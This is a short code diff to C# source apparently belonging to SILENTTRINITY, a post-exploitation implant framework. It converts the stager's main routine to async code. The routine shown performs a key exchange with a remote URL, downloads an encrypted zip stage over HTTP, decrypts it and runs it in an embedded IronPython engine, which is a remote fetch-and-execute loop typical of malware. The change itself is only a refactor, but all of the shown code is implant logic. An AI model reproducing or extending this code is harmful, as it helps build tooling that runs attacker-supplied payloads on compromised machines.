@@ -11,6 +11,8 @@ using System.Security.Cryptography;
 using System.Text;
 using System.Linq;
 using System.Collections.Generic;
+using SILENTTRINITY.Utilities;
+using System.Threading.Tasks;
 //using Boo.Lang.Interpreter;
 //using Boo.Lang.Compiler;
 //using Boo.Lang.Compiler.IO;
@@ -23,7 +25,7 @@ namespace SILENTTRINITY
     {
         static Guid GUID = Guid.NewGuid();
         static Uri URL;
-        // TODO: Migrate to ZipStorer
+
         static ZipStorer Stage;
 
         static ST()
@@ -332,8 +334,8 @@ namespace SILENTTRINITY
                     var stageZip = new ZipArchive(new MemoryStream(decrypted_zip));
             */
 
-            RunIPYEngine();
-
+            Task.Run(async ()=> await RunIPYEngine()).Wait();
+            
             /*
                    var job = GetResourceInZip(jobZip, "main.boo");
                    //RunInBooEngine(Encoding.UTF8.GetString(job, 0, job.Length));
@@ -343,7 +345,7 @@ namespace SILENTTRINITY
         }
 
         // TODO: Decouple this
-        public static void RunIPYEngine()
+        async public static Task RunIPYEngine()
         {
             var engine = CreateEngine();
 
@@ -354,7 +356,7 @@ namespace SILENTTRINITY
 
                 if (Stage == null)
                 {
-                    byte[] key = ECDHKeyExchange(URL);
+                    byte[] key = await Crypto.KeyExchangeAsync(URL);
                     byte[] encrypted_zip = HttpGet(URL);
                     Stage = ZipStorer.Open(new MemoryStream(Decrypt(key, encrypted_zip)), FileAccess.ReadWrite, true);
                 }
